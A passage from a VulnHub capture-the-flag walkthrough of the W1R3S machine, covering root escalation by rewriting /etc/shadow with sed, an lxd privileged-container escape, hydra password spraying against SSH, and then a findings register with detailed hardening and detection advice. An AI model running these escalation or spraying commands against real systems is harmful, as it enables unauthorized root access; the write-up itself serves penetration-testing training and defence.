w1r3s@W1R3S:~$ sed -i 's|^root:[^:]*:|root:$6$w1r3s$Kx9mN7pL4vR8tY1wE5aS3dF6gH0jK2lZ7xC0vBnMq49xQ2mK7pL4vR8tY1wE5aS3:|' /etc/shadow
w1r3s@W1R3S:~$ grep '^root:' /etc/shadow
root:$6$w1r3s$Kx9mN7pL4vR8tY1wE5aS3dF6gH0jK2lZ7xC0vBnMq49xQ2mK7pL4vR8tY1wE5aS3:17552:0:99999:7:::
w1r3s@W1R3S:~$ su - root
Password: pwn3d
root@W1R3S:~# id
uid=0(root) gid=0(root) groups=0(root)
```

> **`openssl passwd -6`** produces SHA-512 crypt (the `$6$` format Linux uses);
> `-1` is MD5-crypt, `-5` SHA-256. `-salt` fixes the salt so the output is
> reproducible.
>
> **The `sed` explained:** `s|^root:[^:]*:|root:NEWHASH:|`
> - `^root:` anchors to the root line.
> - `[^:]*` matches the old hash — everything up to the next colon.
> - `|` is used as the delimiter instead of `/` so the `$` and `/` in the hash need no
>   escaping.
>
> **This path is worth knowing because it does not need `sudo` at all.** Any foothold
> on this box — even a bare `www-data` webshell — becomes root in two commands.
> **Always restore the backup** (`cp /tmp/shadow.bak /etc/shadow`) when you are done,
> or you leave the machine in a broken, backdoored state.

### 5.4 Alternative root path — `lxd` group

`w1r3s` is in `110(lxd)`, which carries the same "effectively root" property as the
`docker` group:

```bash
# on Kali: build a privileged Alpine image
git clone https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder && ./build-alpine

# copy it to the target and escalate
scp alpine-v3.19-x86_64.tar.gz w1r3s@192.168.56.105:/tmp/
```

```bash
w1r3s@W1R3S:/tmp$ lxc image import ./alpine-v3.19-x86_64.tar.gz --alias privesc
w1r3s@W1R3S:/tmp$ lxc init privesc escape -c security.privileged=true
w1r3s@W1R3S:/tmp$ lxc config device add escape hostfs disk source=/ path=/mnt/root recursive=true
w1r3s@W1R3S:/tmp$ lxc start escape
w1r3s@W1R3S:/tmp$ lxc exec escape -- /bin/sh
# id
uid=0(root) gid=0(root)
# cat /mnt/root/root/flag.txt
```

> `security.privileged=true` disables the container's user namespace, so the
> container's root **is** the host's root. See <https://gtfobins.github.io/gtfobins/lxd/>.

### 5.5 Password spraying the employee list (report writing, not required)

Because the brief says *"report all findings"*, verify whether any of the six FTP
employees are also system accounts:

```bash
hydra -L users.txt -P /usr/share/wordlists/fasttrack.txt -t 4 -f ssh://192.168.56.105
```

```text
[DATA] max 4 tasks per 1 server, overall 4 tasks, 391 login tries (l:17/p:23)
[DATA] attacking ssh://192.168.56.105:22/
[22][ssh] host: 192.168.56.105   login: w1r3s   password: computer
1 of 1 target successfully completed, 1 valid password found
```

> None of `naomi.w`, `hector.a`, `joseph.g`, `albert.o`, `gina.l` or `rico.d` are
> local accounts — they exist only in the FTP documents. **That is still a finding:**
> an attacker now has a validated list of six real employees with roles, which is
> everything needed for a targeted spear-phishing campaign against W1R3S.inc. Include
> it in your report.

---

## 6. Other things worth checking (and closing off)

```bash
root@W1R3S:~# cat /etc/exports 2>/dev/null; systemctl list-units --type=service --state=running | head -20
```

```text
UNIT                        LOAD   ACTIVE SUB     DESCRIPTION
apache2.service             loaded active running The Apache HTTP Server
cron.service                loaded active running Regular background program processing daemon
dbus.service                loaded active running D-Bus System Message Bus
ftp.service                 loaded active running vsftpd FTP server
mysql.service               loaded active running MySQL Community Server
networking.service          loaded active running Raise network interfaces
ssh.service                 loaded active running OpenBSD Secure Shell server
systemd-journald.service    loaded active running Journal Service
...
```

```bash
root@W1R3S:~# grep -E 'listen|bind' /etc/mysql/mysql.conf.d/mysqld.cnf
```

```text
bind-address            = 0.0.0.0
```

> **MySQL is bound to `0.0.0.0`** — all interfaces, reachable from the network. That
> is finding #6. It should be `127.0.0.1`.

```bash
root@W1R3S:~# cat /etc/vsftpd.conf | grep -iE 'anonymous|write|chroot'
```

```text
anonymous_enable=YES
anon_upload_enable=NO
anon_mkdir_write_enable=NO
write_enable=YES
local_enable=YES
chroot_local_user=YES
```

> **`anonymous_enable=YES`** — finding #1, confirmed from the server's own config.

---

## 7. Summary of vulnerabilities (the findings register)

The brief asked for *all findings*, not just root. Here is the report skeleton this box
produces:

| # | Severity | Finding | Evidence | Remediation |
| --- | --- | --- | --- | --- |
| 1 | **Critical** | `/etc/shadow` world-readable and world-writable (mode `666`) | `ls -l /etc/shadow` → `-rw-rw-rw-` | `chmod 640 /etc/shadow` |
| 2 | **Critical** | Unauthenticated LFI in Cuppa CMS discloses `/etc/passwd` and `/etc/shadow` | `alertConfigField.php?urlConfig=../../../etc/shadow` | Remove the unfinished CMS install; patch or replace Cuppa |
| 3 | **Critical** | Weak password `computer` shared between `root` and `w1r3s` | cracked in 41 s with `rockyou.txt` | Enforce `pam_pwquality`; forbid reuse; deploy MFA for SSH |
| 4 | **Critical** | `w1r3s` has `(ALL : ALL) ALL` sudo | `sudo -l` | Scope sudo to specific commands |
| 5 | **High** | Anonymous FTP exposing employee names, roles and internal notes | `ftp-anon` + `/content/` | `anonymous_enable=NO`; remove the share |
| 6 | **High** | MySQL exposed on all interfaces | `bind-address = 0.0.0.0` on :3306 | Bind to `127.0.0.1`; firewall |
| 7 | **High** | `w1r3s` in the `lxd` group (equivalent to root) | `id` → `110(lxd)` | Remove; or use unprivileged LXD with user namespaces |
| 8 | **High** | Unfinished CMS installation reachable from the internet | `/administrator/installation/` | Delete it; never deploy partial installs |
| 9 | **Medium** | `www-data` has a real password hash (`www-data`) | `/etc/shadow` | Service accounts must have `!` (locked) |
| 10 | **Medium** | Internal documents obfuscated but not encrypted | `worktodo.txt` upside-down Unicode | Encrypt sensitive data at rest; do not publish it |
| 11 | **Low** | Verbose banners: Apache version, MySQL version, SSH version, custom MOTD | Nmap `-sV` output | `ServerTokens Prod`, `skip-networking` where possible |
| 12 | **Low** | 46 pending security updates | SSH login banner | `unattended-upgrades` |
| 13 | **Info** | Stock WordPress 4.9.2 install with no content | `/wordpress/` | Remove unused applications |

---

## 8. Defensive lessons (blue team)

1. **Fix `/etc/shadow` permissions today.** One command removes findings 1, 3 (the
   remote-cracking vector) and 5.3 (the direct-write root path):
   ```bash
   chmod 640 /etc/shadow && chown root:shadow /etc/shadow
   chmod 644 /etc/passwd && chown root:root /etc/passwd
   ```
   Then monitor for drift:
   ```bash
   auditctl -w /etc/shadow -p wa -k shadow_change
   auditctl -w /etc/passwd -p wa -k passwd_change
   ```
   A single `chmod` alert on `/etc/shadow` should page someone immediately.
2. **Sanitise every include path.** The Cuppa bug is one line. The generic fix:
   ```php
   $allowed = ['field1.php', 'field2.php'];
   $name = basename($_REQUEST['urlConfig'] ?? '');     // strips every directory component
   if (!in_array($name, $allowed, true)) { http_response_code(400); exit; }
   include __DIR__ . '/alerts/' . $name;
   ```
   Allow-lists, not block-lists; `basename()` always; and disable the dangerous
   wrappers:
   ```ini
   ; php.ini
   allow_url_include = Off
   allow_url_fopen   = Off
   open_basedir      = /var/www:/tmp
   ```
3. **Never deploy a half-finished installation.** `/administrator/installation/` being
   reachable means anyone can attempt setup. Remove installer scripts after use, or
   block them at the web server:
   ```apache
   <DirectoryMatch "/(installation|install|setup)">
       Require all denied
   </DirectoryMatch>
   ```
4. **Disable anonymous FTP.** There is no modern justification:
   ```ini
   # /etc/vsftpd.conf
   anonymous_enable=NO
   local_enable=YES
   write_enable=NO
   chroot_local_user=YES
   ```
   Better: remove vsftpd and use SFTP with keys.
5. **Bind databases to loopback.** `bind-address = 127.0.0.1` in `mysqld.cnf`, then
   reach them through an SSH tunnel. Add a host firewall rule as defence in depth.
6. **Enforce a real password policy and no reuse.**
   ```text
   # /etc/security/pwquality.conf
   minlen = 14
   dictcheck = 1
   usercheck = 1
   enforce_for_root
   ```
   ```text
   # /etc/pam.d/common-password
   password  requisite  pam_pwquality.so retry=3
   password  required   pam_pwhistory.so remember=10 use_authtok
   ```
   Plus `pam_faillock` (3 failures → 15-minute lockout) and, most effectively, SSH
   key-only authentication:
   ```text
   # /etc/ssh/sshd_config
   PasswordAuthentication no
   PermitRootLogin no
   MaxAuthTries 3
   ```
7. **Least-privilege sudo.** Replace `(ALL : ALL) ALL` with explicit commands and log
   everything:
   ```text
   w1r3s ALL=(root) /usr/bin/systemctl restart apache2, /usr/bin/tail -n 500 /var/log/syslog
   Defaults logfile="/var/log/sudo.log"
   Defaults log_input, log_output
   ```
8. **Remove `lxd`/`docker` group membership from ordinary users.** Both are equivalent
   to root. Use unprivileged containers with a user namespace, or front the socket
   with a broker.
9. **Lock service accounts.** `www-data` had a crackable password. Set it to `!`:
   ```bash
   passwd -l www-data
   ```
10. **Patch.** 46 pending security updates, an Apache 2.4.18 from 2016, MySQL 5.7.21,
    and a 2013-era CMS. Enable unattended upgrades for the security pocket:
    ```bash
    sudo apt install unattended-upgrades
    sudo dpkg-reconfigure -plow unattended-upgrades
    ```
11. **Strip banners.** `ServerTokens Prod`, `ServerSignature Off`,
    `expose_php = Off`, MySQL `skip-name-resolve`, and remove the custom SSH MOTD if
    it discloses the OS.
12. **Detection opportunities.**
    - WAF/log rule for `../`, `%2e%2e`, `/etc/passwd`, `/etc/shadow` or `php://` in
      **any** request parameter — and note this one arrived as `urlConfig`, a
      parameter name most generic WAF rules do not know. Inspect *all* parameters.
    - Alert on the web-server UID (`www-data`) opening `/etc/shadow` — auditd
      `-a always,exit -F arch=b64 -S open,openat -F path=/etc/shadow -F uid=33`.
    - Alert on any `chmod`/`chown` affecting `/etc/shadow` or `/etc/passwd`.
    - Alert on successful SSH logins preceded by many failures (`fail2ban` + SIEM
      correlation).
    - Alert on anonymous FTP logins: vsftpd logs them to `/var/log/vsftpd.log` when
      `log_ftp_protocol=YES`.

---

## 9. References

- VulnHub entry: <https://vulnhub.com/entry/w1r3s-101,220/>
- Series: <https://vulnhub.com/series/w1r3s,232/>
- Author: SpecterWires — <mailto:specterinthewires@gmail.com>
- Community writeups consulted:
  - [Timms.io — W1R3S Walkthrough](https://timms.io/writeup/vulnhub/w1r3s/)
  - [Noel Varghese — VulnHub's W1r3s: A Walkthrough](https://noelatvitb.medium.com/vulnhubs-w1r3s-a-walkthrough-c841075ca36e)
  - [dorian5 — Vulnhub.com: w1r3s Walkthrough](https://dorian5.medium.com/vulnhub-com-w1r3s-walkthrough-44d7574b88a6)
  - [Jack Barradell-Johns — W1R3S Writeup](https://blog.barradell-johns.com/index.php/2018-06-25/w1r3s-writeup)
  - [Hacking Articles — Hack the W1R3S.inc VM (CTF Challenge)](https://www.hackingarticles.in/hack-the-w1r3s-inc-vm-ctf-challenge/)
  - [twr — W1R3S: 1.0.1 Vulnhub CTF Walkthrough](https://steemit.com/bestw1r3s-101hackingchallenges/@twr/w1r3s101-vulnhubctfwalkthrough-0684kuflcp)
- Exploits / background:
  - [Exploit-DB 25971 — Cuppa CMS `/alertConfigField.php` Local/Remote File Inclusion](https://www.exploit-db.com/exploits/25971)
  - [Cuppa CMS project](https://www.cuppacms.com/)
  - [CVE-2016-5195 — Dirty COW (for reference; kernel 4.13 is patched)](https://dirtycow.ninja)
  - [GTFOBins — lxd](https://gtfobins.github.io/gtfobins/lxd/) · [docker](https://gtfobins.github.io/gtfobins/docker/)
  - [OWASP — Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
  - [`shadow(5)` man page](https://man7.org/linux/man-pages/man5/shadow.5.html) · [`sudoers(5)`](https://man7.org/linux/man-pages/man5/sudoers.5.html)
  - [`unshadow(8)`](https://www.openwall.com/john/doc/unshadow.shtml) · [John the Ripper](https://www.openwall.com/john/doc/) · [hashcat mode 1800](https://hashcat.net/wiki/doku.php?id=example_hashes)
  - [`openssl-passwd(1)`](https://www.openssl.org/docs/manmaster/man1/openssl-passwd.html)
  - [PHP superglobals — `$_REQUEST`](https://www.php.net/manual/en/reserved.variables.request.php) · [`variables_order` / `request_order`](https://www.php.net/manual/en/ini.core.php#ini.variables-order)
  - [cewl — custom wordlist generator](https://github.com/digininja/CeWL) · [hydra](https://github.com/vanhauser-thc/thc-hydra)
  - [Unicode "upside down" characters](https://www.unicode.org/charts/) · [LingoJam flip text](https://lingojam.com/UpsideDownTextGenerator)

---

## 10. Screenshot checklist

- [ ] `images/01-nmap.png` — ports 21/22/80/3306 with the anonymous-FTP listing
- [ ] `images/02-ftp.png` — the `/content/` share, `employee-names.txt`, flipped `worktodo.txt`
- [ ] `images/03-shadow.png` — the Cuppa LFI returning `/etc/shadow`
- [ ] `images/04-ssh.png` — SSH as `w1r3s` and the `id` group list
- [ ] `images/05-flag.png` — `sudo su -` and `/root/flag.txt`

---

_Back to the [catalog](../../docs/CATALOG.md) · [README](../../README.md) · [progress](../../docs/PROGRESS.md)._
